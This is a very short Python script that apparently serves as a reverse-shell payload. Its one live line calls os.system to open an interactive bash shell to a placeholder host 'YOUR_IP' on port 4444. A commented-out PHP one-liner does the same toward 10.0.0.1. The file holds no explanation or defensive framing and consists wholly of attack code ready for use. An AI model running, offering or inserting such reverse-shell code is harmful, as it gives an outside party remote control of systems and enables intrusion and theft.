import os

os.system("bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'")
#php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'